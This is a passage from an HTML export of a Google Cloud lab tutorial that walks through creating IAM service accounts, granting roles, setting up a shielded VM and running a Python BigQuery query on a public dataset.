0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created service account [my-sa-123]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><h5 id='granting-roles-to-service-accounts'><span>Granting roles to service accounts</span></h5><p><span>When granting IAM roles, you can treat a service account either as a </span><a href='https://cloud.google.com/iam/docs/overview#resource'><span>resource</span></a><span> or as an </span><a href='https://cloud.google.com/iam/docs/overview#concepts_related_to_identity'><span>identity</span></a><span>.</span></p><p><span>Your application uses a service account as an identity to authenticate to Google Cloud services. For example, if you have a Compute Engine Virtual Machine (VM) running as a service account, you can grant the editor role to the service account (the identity) for a project (the resource).</span></p><p><span>At the same time, you might also want to control who can start the VM. You can do this by granting a user (the identity) the </span><a href='https://cloud.google.com/iam/docs/service-accounts#the_service_account_user_role'><span>serviceAccountUser</span></a><span> role for the service account (the resource).</span></p><h5 id='granting-roles-to-a-service-account-for-specific-resources'><span>Granting roles to a service account for specific resources</span></h5><p><span>You grant roles to a service account so that the service account has permission to complete specific actions on the resources in your Google Cloud project. For example, you might grant the </span><code>storage.admin</code><span> role to a service account so that it has control over objects and buckets in Cloud Storage.</span></p><ul><li><p><span>Run the following in Cloud Shell to grant roles to the service account you just made:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --member serviceAccount:my-sa-123@$DEVSHELL_PROJECT_ID.iam.gserviceaccount.com --role roles/editor</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output will display a list of roles the service account now has.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bindings:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- members:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - user:email1@gmail.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  role: roles/owner</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- members:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - serviceAccount:our-project-123@appspot.gserviceaccount.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - serviceAccount:123456789012-compute@developer.gserviceaccount.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - serviceAccount:my-sa-123@my-project-123.iam.gserviceaccount.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - user:email3@gmail.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  role: roles/editor</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- members:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - user:email2@gmail.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">role: roles/viewer</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">etag: BwUm38GGAQk=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">version: 1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 338px;"></div><div class="CodeMirror-gutters" style="display: none; height: 338px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Creating and Managing Service Account</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='understanding-roles'><span>Understanding roles</span></h5><p><span>When an identity calls a Google Cloud API, Cloud Identity and Access Management (Cloud IAM) requires that the identity has the appropriate permissions to use the resource. You can grant permissions by granting roles to a user, a group, or a service account.</span></p><h5 id='types-of-roles'><span>Types of roles</span></h5><p><span>There are three types of roles in Cloud IAM:</span></p><ul><li><p><strong><span>Basic roles</span></strong><span>, which include the Owner, Editor, and Viewer roles that existed prior to the introduction of Cloud IAM.</span></p></li><li><p><strong><span>Predefined roles</span></strong><span>, which provide granular access for a specific service and are managed by Google Cloud.</span></p></li><li><p><strong><span>Custom roles</span></strong><span>, which provide granular access according to a user-specified list of permissions.</span></p></li></ul><p><span>For more details, please refer to the </span><a href='https://cloud.google.com/iam/docs/understanding-roles'><span>IAM Roles</span></a><span> reference documentation.</span></p><h4 id='task-2-use-the-client-libraries-to-access-bigquery-from-a-service-account'><span>Task 2. Use the client libraries to access BigQuery from a service account</span></h4><p><span>In this task, you query the BigQuery public datasets from an instance with the help of a service account which has the necessary roles.</span></p><h5 id='create-a-service-account'><span>Create a service account</span></h5><p><span>You will first create a new service account using the Cloud Console.</span></p><ol start='' ><li><p><span>In the Cloud Console, from the navigation menu, click </span><strong><span>IAM &amp; Admin &gt; Service accounts</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create service account</span></strong><span>.</span></p></li><li><p><span>Specify the Service account name as </span><code>bigquery-qwiklab</code><span>.</span></p></li></ol><p><img src="images\bFhspDPOVq%2Fom%2BcPEgwU%2BG6ynXYyr18mJp%2BP0QjbpwU%3D.png" referrerpolicy="no-referrer" alt="Create service account configuration dialog"></p><ol start='' ><li><p><span>Click </span><strong><span>Create and Continue</span></strong><span>.</span></p></li><li><p><span>Specify the Role as </span><strong><span>BigQuery &gt; BigQuery Data Viewer</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Another Role</span></strong><span>.</span></p></li><li><p><span>Specify the other Role as </span><strong><span>BigQuery &gt; BigQuery User</span></strong><span>.</span></p></li></ol><p><img src="images\Sz9fRNxS0FZVHl1RWHOuRZScilM3gYc82jie0ecDU%2Fs%3D" referrerpolicy="no-referrer" alt="Create service account optional role access permission"></p><ol start='' ><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>Your Cloud Console should resemble the following.</span></p><p><img src="images\h%2BqSWGIekBJqByhXJexm3JRwD6abb0swD2SEfCcFhqw%3D" referrerpolicy="no-referrer" alt="Grant users access to service_account step 3"></p><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><h5 id='create-a-vm-instance'><span>Create a VM instance</span></h5><ol start='' ><li><p><span>In the Cloud Console, from the navigation menu, click </span><strong><span>Compute Engine &gt; VM Instances</span></strong><span>, and click </span><strong><span>Create instance</span></strong><span>.</span></p></li><li><p><span>Create your VM with the following information:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>Configuration</span></strong></th><th><strong><span>Value</span></strong></th></tr></thead><tbody><tr><td><strong><span>Name</span></strong></td><td><code>bigquery-instance</code></td></tr><tr><td><strong><span>Region</span></strong></td><td><code>us-east4</code></td></tr><tr><td><strong><span>Zone</span></strong></td><td><code>us-east4-b</code></td></tr><tr><td><strong><span>Series</span></strong></td><td><code>E2</code></td></tr><tr><td><strong><span>Machine Type</span></strong></td><td><code>e2-standard-2 (2 vCPU)</code></td></tr><tr><td><strong><span>Boot Disk</span></strong></td><td><code>Debian GNU/Linux 11 (bulleye)</code></td></tr><tr><td><strong><span>Service Account</span></strong></td><td><code>bigquery-qwiklab</code></td></tr><tr><td><strong><span>Access scopes</span></strong></td><td><code>Allow full access to all Cloud APIs</code></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> If the </span><code>bigquery-qwiklab</code><span> service account doesn&#39;t appear in the drop-down list, try typing the name in to the </span><em><span>Filter</span></em><span> section.</span></p><p><span>Next, you will look at the options that were added when you selected a boot disk that supports shielded VMs.</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Security</span></strong><span> tab. At the top of the tab, the Shielded VM options appear. If you had not selected a boot disk with shielded VM features, these options would not have appeared. Some of these options are selected by default.</span></p></li><li><p><span>Click the </span><strong><span>Turn on Secure Boot</span></strong><span> checkbox.</span></p></li></ol><p><img src="images\cmd9g48jzGdo%2Ba%2FAOKeAztsF0Y6dyAzaiqwe9ZDYkUI%3D" referrerpolicy="no-referrer" alt="Security dialog turn on secure boot enabled"></p><p><span>Compute Engine does not enable this option by default, because unsigned drivers and other low-level software might not be compatible. Even so, if possible, Google recommends enabling Secure Boot.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h5 id='put-the-example-code-on-a-compute-engine-instance'><span>Put the example code on a Compute Engine instance</span></h5><ol start='' ><li><p><span>In the Cloud Console, go to </span><strong><span>Compute Engine &gt; VM Instances</span></strong><span>.</span></p></li><li><p><span>SSH into </span><code>bigquery-instance</code><span> by clicking on the </span><strong><span>SSH</span></strong><span> button. Click </span><strong><span>Connect</span></strong><span>.</span></p></li><li><p><span>In the SSH window, install the necessary dependencies by running the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get update -y</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install -y git python3-pip</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo pip3 install six==1.13.0</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo pip3 install --upgrade pip</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo pip3 install --upgrade google-cloud-bigquery</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo pip3 install pandas</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Using the </span><code>echo</code><span> command, create </span><code>query.py</code><span>. You will use this file, written in Python, to run the query.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from google.auth import compute_engine</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from google.cloud import bigquery</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">credentials = compute_engine.Credentials(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  service_account_email='YOUR_SERVICE_ACCOUNT')</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">query = '''</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  COUNT(1) as num_babies</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  publicdata.samples.natality</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year &gt; 2000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GROUP BY</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'''</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">client = bigquery.Client(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  project='YOUR_PROJECT_ID',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  credentials=credentials)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">print(client.query(query).to_dataframe())</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">" &gt; query.py</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 540px;"></div><div class="CodeMirror-gutters" style="display: none; height: 540px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add the Project ID to </span><code>query.py</code><span> with:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sed -i -e "s/YOUR_PROJECT_ID/$(gcloud config get-value project)/g" query.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following to make sure that the </span><code>sed</code><span> command has successfully changed the Project ID in the file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div 